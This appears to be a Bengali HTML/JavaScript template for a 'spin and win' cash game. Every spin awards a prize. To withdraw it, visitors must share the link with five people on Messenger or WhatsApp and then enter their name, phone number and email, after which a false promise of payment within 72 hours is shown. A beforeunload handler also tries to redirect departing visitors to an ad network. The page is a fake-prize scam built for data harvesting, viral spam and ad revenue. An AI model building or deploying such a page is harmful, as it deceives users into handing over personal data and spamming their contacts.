<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎰 স্পিন করুন ও পুরস্কার জিতুন!</title>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; background-color: #f4f4f4; }
        .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0px 0px 10px gray; }
        #wheelCanvas { margin-top: 20px; border: 4px solid #333; border-radius: 50%; background: #fff; }
        button { padding: 10px 20px; font-size: 18px; cursor: pointer; background: green; color: white; border: none; border-radius: 5px; margin-top: 15px; }
        #rewardMessage, #withdrawSection, #loadingSection, #submitForm, #confirmationMessage, #shareSection { display: none; margin-top: 20px; }
        input { padding: 10px; margin: 5px; width: 90%; border: 1px solid #ccc; border-radius: 5px; }
        .error { color: red; font-size: 14px; display: none; }
        .share-buttons { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }
        .share-buttons button { background: #007bff; display: flex; align-items: center; gap: 5px; }
        .share-link { margin-top: 10px; font-size: 14px; color: #333; }
        .share-link textarea { width: 100%; height: 60px; padding: 10px; border: 1px solid #ccc; border-radius: 5px; resize: none; }
        .copy-button { margin-top: 10px; background: #28a745; }
        .copy-button.copied { background: #6c757d; }
        .share-instruction { font-size: 14px; color: #555; margin-top: 10px; }
        .social-icons { width: 20px; height: 20px; }
        .popup-button { background: #ff5722; margin-top: 20px; }
        .ads-section { margin-top: 20px; padding: 10px; background: #f9f9f9; border: 1px solid #ccc; border-radius: 5px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>🎯 স্পিন করুন ও পুরস্কার জিতুন! 🎁</h1>
        <canvas id="wheelCanvas" width="300" height="300"></canvas>
        <br>
        <button onclick="spinWheel()">🎰 স্পিন করুন</button>

        <!-- এডস সেকশন -->
        <div class="ads-section">
            <p>এখানে Adsterra এডস দেখানো হবে।</p>
        </div>

        <div id="rewardMessage"></div>
        <div id="withdrawSection">
            <h2>💰 উত্তোলন করুন</h2>
            <button onclick="showShareSection()">📤 উত্তোলনের জন্য শেয়ার করুন</button>
        </div>

        <div id="shareSection">
            <h2>শেয়ার করুন</h2>
            <p class="share-instruction">উত্তোলন করতে নিচের লিঙ্কটি কপি করে আপনার পছন্দের সোশ্যাল মিডিয়ায় ৫ জনকে শেয়ার করুন:</p>
            <div class="share-link">
                <textarea id="shareLinkText" readonly></textarea>
                <button class="copy-button" onclick="copyShareLink()">📋 লিঙ্ক কপি করুন</button>
            </div>
            <div class="share-buttons">
                <button onclick="shareOnMessenger()">
                    <img src="https://img.icons8.com/color/48/000000/facebook-messenger.png" class="social-icons" alt="Messenger">
                    ম্যাসেন্জার
                </button>
                <button onclick="shareOnWhatsApp()">
                    <img src="https://img.icons8.com/color/48/000000/whatsapp.png" class="social-icons" alt="WhatsApp">
                    হোয়াটসঅ্যাপ
                </button>
            </div>
            <button onclick="showSubmitForm()">শেয়ার সম্পন্ন হয়েছে</button>
        </div>

        <div id="submitForm">
            <h2>তথ্য সাবমিট করুন</h2>
            <form id="withdrawForm">
                <input type="text" id="name" placeholder="আপনার নাম" required>
                <div class="error" id="nameError">নাম অবশ্যই পূরণ করতে হবে।</div>
                <input type="tel" id="phone" placeholder="ফোন নম্বর" required>
                <div class="error" id="phoneError">সঠিক ফোন নম্বর দিন (১১ ডিজিট)।</div>
                <input type="email" id="email" placeholder="ইমেইল ঠিকানা" required>
                <div class="error" id="emailError">সঠিক ইমেইল দিন।</div>
                <input type="text" id="amount" placeholder="উত্তোলনের পরিমাণ" readonly>
                <button type="submit">সাবমিট করুন</button>
            </form>
        </div>

        <div id="loadingSection">
            <h2>⏳ উত্তোলনের অনুরোধ গ্রহণ হয়েছে...</h2>
            <p>✅ আমরা ৭২ ঘণ্টার মধ্যে টাকা পাঠিয়ে দেব। ধন্যবাদ!</p>
        </div>

        <div id="confirmationMessage">
            <h2>📩 কনফার্মেশন মেসেজ</h2>
            <p id="confirmationText"></p>
            <button class="popup-button" onclick="confirmAction()">কনফার্ম করুন</button>
            <button onclick="resetGame()">আবার খেলুন</button>
        </div>
    </div>

    <script>
        let canvas = document.getElementById("wheelCanvas");
        let ctx = canvas.getContext("2d");
        let prizes = ["১০ টাকা", "২০ টাকা", "৫০ টাকা", "১০০ টাকা", "২০০ টাকা", "৫০০ টাকা", "১০০০ টাকা"];
        let colors = ["red", "blue", "green", "orange", "purple", "pink", "yellow"];
        let startAngle = 0;
        let spinAngle = 0;
        let spinning = false;
        let selectedPrize = "";

        // Adsterra রিডাইরেক্ট লিংক
        const adsterraLink = "https://www.adsterra.com";

        // কনফার্মেশন লিংক
        const confirmationLink = "https://www.example.com";

        // গেমটি কমপ্লিট না করলে বা বেক আসতে চাইলে Adsterra-র লিংকে রিডাইরেক্ট
        window.addEventListener("beforeunload", function(event) {
            if (!document.getElementById("confirmationMessage").style.display === "block") {
                window.location.href = adsterraLink;
            }
        });

        function drawWheel() {
            let arc = Math.PI / (prizes.length / 2);
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < prizes.length; i++) {
                let angle = startAngle + i * arc;
                ctx.fillStyle = colors[i];
                ctx.beginPath();
                ctx.moveTo(150, 150);
                ctx.arc(150, 150, 150, angle, angle + arc);
                ctx.lineTo(150, 150);
                ctx.fill();
                ctx.fillStyle = "white";
                ctx.font = "14px Arial";
                ctx.fillText(prizes[i], 120 + 100 * Math.cos(angle + arc / 2), 150 + 100 * Math.sin(angle + arc / 2));
            }
        }

        function spinWheel() {
            if (spinning) return;
            spinning = true;
            let randomIndex = Math.floor(Math.random() * prizes.length);
            selectedPrize = prizes[randomIndex];
            spinAngle = 3600 + randomIndex * (360 / prizes.length);
            let spinInterval = setInterval(() => {
                startAngle += 10 * Math.PI / 180;
                if (spinAngle > 0) {
                    spinAngle -= 10;
                } else {
                    clearInterval(spinInterval);
                    spinning = false;
                    document.getElementById("rewardMessage").innerHTML = `<h2>🎉 অভিনন্দন! আপনি জিতেছেন ${selectedPrize}!</h2>`;
                    document.getElementById("rewardMessage").style.display = "block";
                    document.getElementById("withdrawSection").style.display = "block";
                }
                drawWheel();
            }, 20);
        }

        function showShareSection() {
            document.getElementById("withdrawSection").style.display = "none";
            document.getElementById("shareSection").style.display = "block";
            generateShareLink();
        }

        function generateShareLink() {
            let shareMessage = `আমি এই গেমটিতে ${selectedPrize} জিতেছি! আপনি চেষ্টা করে দেখুন: ${window.location.href}`;
            document.getElementById("shareLinkText").value = shareMessage;
        }

        function copyShareLink() {
            let shareLinkText = document.getElementById("shareLinkText");
            shareLinkText.select();
            document.execCommand("copy");
            let copyButton = document.querySelector(".copy-button");
            copyButton.textContent = "✔️ লিঙ্ক কপি হয়েছে!";
            copyButton.classList.add("copied");
            setTimeout(() => {
                copyButton.textContent = "📋 লিঙ্ক কপি করুন";
                copyButton.classList.remove("copied");
            }, 2000);
        }

        function shareOnMessenger() {
            let shareMessage = `আমি এই গেমটিতে ${selectedPrize} জিতেছি! আপনি চেষ্টা করে দেখুন: ${window.location.href}`;
            let messengerLink = `https://www.facebook.com/dialog/send?link=${encodeURIComponent(window.location.href)}&app_id=YOUR_APP_ID&redirect_uri=${encodeURIComponent(window.location.href)}`;
            window.open(messengerLink, "_blank");
        }

        function shareOnWhatsApp() {
            let shareMessage = `আমি এই গেমটিতে ${selectedPrize} জিতেছি! আপনি চেষ্টা করে দেখুন: ${window.location.href}`;
            let whatsappLink = `https://wa.me/?text=${encodeURIComponent(shareMessage)}`;
            window.open(whatsappLink, "_blank");
        }

        function showSubmitForm() {
            document.getElementById("shareSection").style.display = "none";
            document.getElementById("submitForm").style.display = "block";
            document.getElementById("amount").value = selectedPrize;
        }

        function validateForm() {
            let name = document.getElementById("name").value.trim();
            let phone = document.getElementById("phone").value.trim();
            let email = document.getElementById("email").value.trim();
            let isValid = true;

            if (name === "") {
                document.getElementById("nameError").style.display = "block";
                isValid = false;
            } else {
                document.getElementById("nameError").style.display = "none";
            }

            if (!/^\d{11}$/.test(phone)) {
                document.getElementById("phoneError").style.display = "block";
                isValid = false;
            } else {
                document.getElementById("phoneError").style.display = "none";
            }

            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                document.getElementById("emailError").style.display = "block";
                isValid = false;
            } else {
                document.getElementById("emailError").style.display = "none";
            }

            return isValid;
        }

        document.getElementById("withdrawForm").addEventListener("submit", function(event) {
            event.preventDefault();
            if (!validateForm()) return;

            let name = document.getElementById("name").value;
            let phone = document.getElementById("phone").value;
            let email = document.getElementById("email").value;
            let amount = document.getElementById("amount").value;

            // সিমুলেটেড API কল
            fetch("https://jsonplaceholder.typicode.com/posts", {
                method: "POST",
                body: JSON.stringify({ name, phone, email, amount }),
                headers: { "Content-type": "application/json; charset=UTF-8" }
            })
            .then(response => response.json())
            .then(data => {
                console.log("সার্ভার রেসপন্স:", data);
                document.getElementById("submitForm").style.display = "none";
                document.getElementById("loadingSection").style.display = "block";

                setTimeout(() => {
                    document.getElementById("loadingSection").style.display = "none";
                    document.getElementById("confirmationMessage").style.display = "block";
                    document.getElementById("confirmationText").innerHTML = `
                        আপনার উত্তোলনের অনুরোধ সফলভাবে জমা হয়েছে।<br>
                        নাম: ${name}<br>
                        ফোন নম্বর: ${phone}<br>
                        ইমেইল: ${email}<br>
                        উত্তোলনের পরিমাণ: ${amount}
                    `;
                }, 3000);
            })
            .catch(error => console.error("ত্রুটি:", error));
        });

        function confirmAction() {
            window.location.href = confirmationLink;
        }

        function resetGame() {
            document.getElementById("confirmationMessage").style.display = "none";
            document.getElementById("rewardMessage").style.display = "none";
            document.getElementById("withdrawSection").style.display = "none";
            document.getElementById("submitForm").style.display = "none";
            document.getElementById("loadingSection").style.display = "none";
            document.getElementById("shareSection").style.display = "none";
            document.getElementById("name").value = "";
            document.getElementById("phone").value = "";
            document.getElementById("email").value = "";
            document.getElementById("amount").value = "";
            selectedPrize = "";
            drawWheel();
        }

        drawWheel();
    </script>

</body>
</html>
